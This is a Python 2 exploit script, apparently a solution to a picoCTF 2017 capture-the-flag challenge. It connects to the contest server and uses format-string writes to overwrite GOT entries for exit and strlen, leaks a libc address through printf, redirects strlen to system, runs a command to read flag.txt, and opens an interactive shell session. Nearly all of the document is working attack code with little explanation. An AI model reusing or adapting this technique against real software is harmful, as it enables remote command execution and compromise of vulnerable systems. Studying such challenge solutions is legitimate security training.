import struct
import time
import math
from socket import *

EXIT_PLT = 0x601258
STRLEN_PLT = 0x601210
PRINTF_PLT = 0x601220
SYSTEM_OFFSET = 0x41490

def pad(string, length):
  return string+"\x90"*(length-len(string))

def recv_timeout(the_socket,timeout=2):
    the_socket.setblocking(0)
    total_data=[];
    data='';
    begin=time.time()
    while 1:
        if total_data and time.time()-begin > timeout:
            break
        elif time.time()-begin > timeout*2:
            break
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                begin = time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    return ''.join(total_data)

s = socket(AF_INET, SOCK_STREAM)
s.connect(('shell2017.picoctf.com', 26325))

print recv_timeout(s)

#PAYLOD 1 - Redirects exit(), so it loops safely

exploit = pad("e ",8) #8 characters
exploit += "\x90"*8*5 #Padding to empty spaces

exploit += pad("%4196426x%22$n", 16) #Redirects to 0x400878
exploit += struct.pack("<Q",EXIT_PLT)

s.send(exploit+"\n")
print recv_timeout(s)

#PAYLOAD 2 - Get base address
base = ''
for x in range(0,8):
    exploit = pad("e ",8) #8 characters
    exploit += "\x90"*8*7 #Padding to empty spaces
    exploit += struct.pack("<Q",PRINTF_PLT+x)
    s.send(exploit+"\n")
    print recv_timeout(s)

    exploit = "e "+"%x"*21+"A%.1sZ"
    s.send(exploit+"\n")
    data = recv_timeout(s)
    data = data[data.index("A")+1:data.index("Z")]
    if len(data) == 0:
        base = '00' + base
    else:
        c = hex(ord(data[0]))[2:]
        base = '0'*(2-len(c)) + c + base

#PAYLOAD 3 - Set system address
#baseAddress = "7ffff7a3b000" #Test Value

addr = int(base, 16)
addr -= 0x50cf0
print hex(addr)
addr += SYSTEM_OFFSET
address = hex(addr)

#End
portion = address[-4:]
numpad = int(portion, 16) - 47

exploit = pad("e ",8)
exploit += pad("%"+str(numpad)+"x", 8*6)
exploit += pad("%22$hn",8)
exploit += struct.pack("<Q",STRLEN_PLT)

#print portion
s.send(exploit+"\n")
print recv_timeout(s)

#Middle
portion = address[-8:-4]
numpad = int(portion, 16) - 47

exploit = pad("e ",8)
exploit += pad("%"+str(numpad)+"x", 8*6)
exploit += pad("%22$hn",8)
exploit += struct.pack("<Q",STRLEN_PLT+2)

#print portion
s.send(exploit+"\n")
print recv_timeout(s)

#Front
portion = address[-12:-8]
numpad = int(portion, 16) - 47

exploit = pad("e ",8)
exploit += pad("%"+str(numpad)+"x", 8*6)
exploit += pad("%22$hn",8)
exploit += struct.pack("<Q",STRLEN_PLT+4)

#print portion
s.send(exploit+"\n")
print recv_timeout(s)

#print "p /bin/sh"
s.send("p /bin/cat flag.txt"+"\n")
print recv_timeout(s)

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
